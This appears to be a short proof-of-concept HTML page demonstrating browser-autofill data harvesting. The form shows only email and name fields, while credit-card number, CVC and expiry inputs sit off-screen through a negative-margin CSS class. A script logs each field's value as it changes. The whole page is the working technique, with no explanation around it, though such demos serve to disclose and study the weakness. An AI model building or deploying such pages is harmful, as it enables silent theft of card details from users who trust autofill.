<html>
  <head>
    <style>
      .hide { margin-left: -1000px; }
    </style>
  </head>
  <body>
    <form>
      <p>
        <input name="email" required placeholder="email" autocomplete="email">
      </p>
      <p>
        <input type="submit" value="Submit">
      <p>
        <input name="ccname" required placeholder="Full Name" autocomplete="cc-name">
      </p>
      <p>
        <input class="hide" name="cardnumber" required autocomplete="cc-number">
      </p>
      <p>
        <input class="hide" name="cvc" required autocomplete="cc-csc">
      </p>
      <p>
        <input class="hide" name="cc-exp" required placeholder="MM-YYYY" autocomplete="cc-exp">
      </p>
    </form>
    <script>
      function onChange (e) { console.log(e.target.name + ":" + e.target.value) };
      var els = document.querySelectorAll('form');
      [].forEach.call(els[0], function(e) { e.addEventListener('change', onChange) });
    </script>
  </body>
</html>
